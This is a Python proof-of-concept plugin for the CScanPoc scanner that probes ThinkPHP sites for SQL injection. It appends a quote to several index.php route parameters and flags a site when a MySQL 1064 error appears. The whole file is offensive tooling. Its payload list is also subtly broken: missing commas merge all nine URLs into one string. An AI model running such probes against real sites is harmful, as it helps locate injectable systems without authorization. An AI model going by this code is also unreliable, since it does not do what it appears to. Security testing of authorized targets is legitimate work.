# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0005'  # 平台漏洞编号，留空
    name = 'ThinkPHP SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        ThinkPHP index.php 多处参数过滤不严谨，导致SQL注入漏洞。 
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '86cf7eeb-be39-443a-9279-245e78f11bba'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                '/index.php?s=/home/shopcart/getPricetotal/tag/1%27'
                '/index.php?s=/home/shopcart/getpriceNum/id/1%27'
                '/index.php?s=/home/user/cut/id/1%27'
                '/index.php?s=/home/service/index/id/1%27'
                '/index.php?s=/home/pay/chongzhi/orderid/1%27'
                '/index.php?s=/home/pay/index/orderid/1%27'
                '/index.php?s=/home/order/complete/id/1%27'
                '/index.php?s=/home/order/detail/id/1%27'
                '/index.php?s=/home/order/cancel/id/1%27'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                code, head, res, errcode, _ = hh.http(verify_url)

                if '1064 You have' in res:
                    #security_hole("infomation leak:"+poc)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
